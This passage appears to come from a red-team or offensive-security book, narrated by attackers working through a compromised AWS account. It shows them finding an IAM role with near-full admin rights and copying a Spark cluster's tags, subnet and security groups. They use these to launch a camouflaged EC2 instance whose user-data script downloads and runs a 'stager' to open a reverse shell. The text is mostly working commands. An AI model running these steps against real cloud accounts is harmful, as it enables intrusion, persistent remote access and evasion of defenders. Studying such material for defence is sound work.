```
--profile camellia \
--policy-arn arn:aws:iam::983457354409:policy/rundeck-mono-policy

"Action":["ec2:*", "ecr:*", "iam:*", "rds:*", "redshift:*",...]
"Resource": "*"
--snip--
```

Yes, that’s the role we need. The rundeck role has close to full admin privileges over AWS.

The plan, therefore, is to spin up an instance in the same subnet as the Spark cluster. We carefully reproduce the same attributes to hide in plain sight: security groups, tags, everything. We’re finding the attributes so we can later imitate them:

```
root@Point1:~/# aws ec2 describe-instances --profile camellia \
--filters 'Name=tag:Name,Values=*spark*'

--snip--
"Tags":
    Key: Name  Value: spark-master-streaming
"ImageId": "ami-02df9ea15c1778c9c",
"InstanceType": "m5.xlarge",
"SubnetId": "subnet-00580e48",
"SecurityGroups":
    GroupName: spark-master-all, GroupId: sg-06a91d40a5d42fe04
    GroupName: spark-worker-all, GroupId: sg-00de21bc7c864cd25
--snip--
```

We know for a fact that Spark workers can reach the internet over port 443, so we just lazily copy and paste the security groups we just confirmed and launch a new instance with the rundeck profile with those attributes:

```
root@Point1:~/# aws ec2 run-instances \
--image-id ami-02df9ea15c1778c9c \
--count 1 \
--instance-type m3.medium \
--iam-instance-profile rundeck \
--subnet-id subnet-00580e48 \
--security-group-ids sg-06a91d40a5d42fe04 \
--tag-specifications 'ResourceType=instance,Tags= [{Key=Name,Value=spark-worker-5739ecea19a4}]' \
--user-data file://my_user_data.sh \
--profile camellia \
--region eu-west-1
```

The script passed as user data (my_user_data.sh) will bootstrap our reverse shell:

```
#!/bin/bash
wget https://gretsch-spark-eu.s3.amazonaws.com/stager
chmod +x ./stager
./stager&
```